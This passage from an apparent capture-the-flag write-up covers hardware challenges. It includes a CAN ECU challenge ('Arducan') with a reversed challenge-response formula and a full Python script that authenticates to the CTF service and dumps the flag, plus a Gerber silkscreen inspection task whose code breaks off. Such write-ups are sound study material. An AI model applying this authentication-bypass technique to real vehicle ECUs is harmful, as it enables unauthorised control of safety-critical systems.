</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;flag.txt.encrypted&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span><span class="p">,</span> <span class="n">tag</span> <span class="o">=</span> <span class="n">blob</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">28</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="mi">28</span><span class="p">:</span><span class="o">-</span><span class="mi">16</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="o">-</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">ChaCha20Poly1305</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span> <span class="o">+</span> <span class="n">tag</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><h2 id="hardware-">Hardware üîå<a hidden class="anchor" aria-hidden="true" href="#hardware-">#</a></h2>
<h3 id="arducan">Arducan<a hidden class="anchor" aria-hidden="true" href="#arducan">#</a></h3>
<h4 id="analysis-18">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-18">#</a></h4>
<p>The firmware <code>sketch.elf</code> exposes a textual CAN ECU accessible over TCP: it accepts frames formatted as
<code>CAN_ID:LEN:BYTE0,BYTE1,...</code> and implements a small state machine gated by an authentication step. The high‚Äëlevel
flow is: perform a diagnostic handshake, request a 32‚Äëbit challenge, compute and send a deterministic response,
send two identical state commands to advance an internal latch, then read the flag from memory in chunks.</p>
<p>Key IDs and behavior: 0x7E0 (diagnostic handshake), 0x600 (authentication), 0x700 (state commands), and 0x7FF
(flag reads). On a challenge request (internal opcode 0x7C) the firmware returns 4 challenge bytes and a
sequence counter (<code>seq</code>). The required response is:</p>
<p><code>resp = ((challenge ^ 0xDEADBEEF) * 0x1337 + seq) &amp; 0xffffffff</code></p>
<p>Send this on CAN 0x600 with leading byte 0xC3 followed by the 4‚Äëbyte big‚Äëendian response. After a valid auth,
two identical <code>0x700:4:69,13,37,42</code> frames advance the latch. The flag is read by sending <code>0x7FF</code> frames with
opcode <code>0xF1</code> and an offset; replies contain up to 6 ASCII bytes per request.</p>
<h4 id="solution-15">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-15">#</a></h4>
<p>A compact procedure to retrieve the flag: perform the TCP connect and drain the banner; send <code>0x7E0:2:A5,A5</code>
for the diagnostic handshake; request the challenge with <code>0x600:2:3C,00</code>, parse the 4‚Äëbyte challenge and the
<code>seq</code> from the reply, compute <code>resp</code> as shown above and send it as <code>0x600:5:C3,RR,RR,RR,RR</code> (big‚Äëendian). Once
confirmed, send <code>0x700:4:69,13,37,42</code> twice (identical, consecutive) to unlock reads. Finally, iterate reads of
<code>0x7FF:2:F1,offset</code> with offset += 6 and concatenate returned 6‚Äëbyte chunks until the tail is shorter than 6.</p>
<p>Essential one‚Äëliner: CONNECT &ndash;&gt; <code>0x7E0:2:A5,A5</code> &ndash;&gt; <code>0x600:2:3C,00</code> &ndash;&gt; parse(chal,seq) &ndash;&gt; <code>0x600:5:C3,resp_be</code> &ndash;&gt;
<code>0x700</code> x2 &ndash;&gt; repeated <code>0x7FF:2:F1,offset</code>.</p>
<h4 id="script-13">Script<a hidden class="anchor" aria-hidden="true" href="#script-13">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Tuple</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;303ed4c6.ctf.ac.upt.ro&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9730</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FRAME_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^([0-9A-Fa-f]+):(\d+):(.*)$&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_line</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">sock_file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ConnectionError</span><span class="p">(</span><span class="s2">&#34;Connection closed by remote host&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;&lt; </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">wait_for_frame</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">recv_line</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">FRAME_RE</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">can_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_str</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">part</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">data_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">part</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">can_id</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="n">can_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">can_id</span><span class="si">:</span><span class="s2">03X</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">frame</span> <span class="o">+=</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s2">02X</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&gt;&gt; </span><span class="si">{</span><span class="n">frame</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">wait_for_frame</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_auth_response</span><span class="p">(</span><span class="n">challenge</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">seq</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span> <span class="n">challenge</span> <span class="o">^</span> <span class="mh">0xDEADBEEF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">*</span> <span class="mh">0x1337</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">+</span> <span class="p">(</span><span class="n">seq</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock_file</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Drain the banner</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">line</span> <span class="o">=</span> <span class="n">sock_file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="n">text</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;&lt; </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">,</span> <span class="ne">ConnectionError</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 0: ECU diagnostic kick-off</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x7E0</span><span class="p">,</span> <span class="p">[</span><span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 1: request authentication challenge</span>
</span></span><span class="line"><span class="cl">        <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x608</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x7C</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Unexpected authentication challenge response&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">challenge_bytes</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">seq_counter</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">challenge</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Challenge: 0x</span><span class="si">{</span><span class="n">challenge</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">, seq=</span><span class="si">{</span><span class="n">seq_counter</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 2: send authentication response</span>
</span></span><span class="line"><span class="cl">        <span class="n">auth_value</span> <span class="o">=</span> <span class="n">compute_auth_response</span><span class="p">(</span><span class="n">challenge</span><span class="p">,</span> <span class="n">seq_counter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">auth_payload</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xC3</span><span class="p">]</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">auth_value</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="n">auth_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x608</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xD3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Authentication failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seq_counter</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq_counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 3: state commands (send twice)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x708</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x79</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;State command rejected&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 4: request flag chunks</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">can_id</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x7FF</span><span class="p">,</span> <span class="p">[</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">offset</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x7F8</span> <span class="ow">or</span> <span class="n">length</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xF1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Flag request rejected&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag_bytes</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">flag_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="baby-board">Baby Board<a hidden class="anchor" aria-hidden="true" href="#baby-board">#</a></h3>
<h4 id="analysis-19">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-19">#</a></h4>
<p>We were given a ZIP of <strong>Gerber fabrication files</strong> (<code>Gerber_PCB1_2025-11-08.zip</code>), the standard CAM outputs for PCB manufacturing (copper, solder mask, silkscreen, drills, etc.). Gerbers are simple plotter-like instructions: move/draw with apertures, one file per layer. Flags in &ldquo;hardware&rdquo; CTFs are often hidden in the <strong>top silkscreen</strong> (component legend) or copper text.</p>
<p>With no running service to poke, this was a pure inspection/format task. The likely flag locations, in order:</p>
<ol>
<li><strong>Top Silkscreen</strong> (<code>*.GTO</code>)</li>
<li><strong>Bottom Silkscreen</strong> (<code>*.GBO</code>)</li>
<li><strong>Copper layers</strong> (e.g., <code>*.GTL</code>, <code>*.GBL</code>) as negative-space text</li>
<li><strong>Board outline</strong> / <strong>mech</strong> layers (<code>*.GKO</code>, <code>*.GML</code>)</li>
<li>Drill/map notes</li>
</ol>
<h4 id="solution-16">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-16">#</a></h4>
<p>I opened the archive and inspected the <strong>Top Silkscreen</strong> file (<code>Gerber_TopSilkscreenLayer.GTO</code>). You can view Gerbers with a GUI (e.g., <code>gerbv</code>, KiCad&rsquo;s Gerber Viewer, or InteractiveHtmlBom), but I also made a quick parser/plotter to be sure.</p>
<p>The file uses common RS-274X constructs:</p>
<ul>
<li><strong>Units:</strong> mm (<code>MOMM</code>)</li>
<li><strong>Format spec:</strong> e.g., <code>FSLAX45Y45</code> -&gt; X/Y are 4 integer + 5 decimal places</li>
<li><strong>Moves/Draws:</strong> <code>D02</code> = move (pen up), <code>D01</code> = draw (pen down), typically with <code>G01</code> for linear interpolation</li>
</ul>
<p>By plotting the <code>G01 X... Y... D..*</code> commands in order, the <strong>vector strokes</strong> of silkscreen text appear. Zooming the upper area of the board revealed the flag rendered as outline text.</p>
<p>I exported a zoomed preview of the silkscreen showing the flag:</p>
<p><img alt="Zoomed silkscreen flag" loading="lazy" src="/images/silkscreen.png"></p>
<h4 id="script-14">Script<a hidden class="anchor" aria-hidden="true" href="#script-14">#</a></h4>
<p>A minimal Python snippet to parse &amp; visualize the strokes from the GTO (silkscreen) file. It extracts <code>G01</code> moves, interprets <code>D02</code>/<code>D01</code> (move/draw), scales to mm, and plots:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s2">&#34;/mnt/data/Gerber_PCB1_2025-11-08.zip&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gto</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;Gerber_TopSilkscreenLayer.GTO&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scale</span> <span class="o">=</span> <span class="mf">1e5</span>  <span class="c1"># for FSLAX45Y45 (4.5 format)</span>
</span></span><span class="line"><span class="cl">
